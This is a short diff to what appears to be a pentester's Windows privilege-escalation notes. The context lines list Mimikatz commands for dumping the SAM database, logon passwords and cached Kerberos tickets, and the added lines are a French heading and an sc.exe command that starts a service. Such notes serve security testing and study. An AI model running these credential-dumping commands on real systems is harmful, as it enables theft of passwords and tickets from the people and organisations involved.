@@ -65,3 +65,6 @@ token::elevate + lsadump::sam --> Dump from SAM database
 sekurlsa::logonpasswords --> Dump from Sekurlsa  
 sekurlsa::tickets --> Dump cached tickets  
 Some source: https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html  
+
+## démarer un service:  
+sc.exe start audtiTracker  
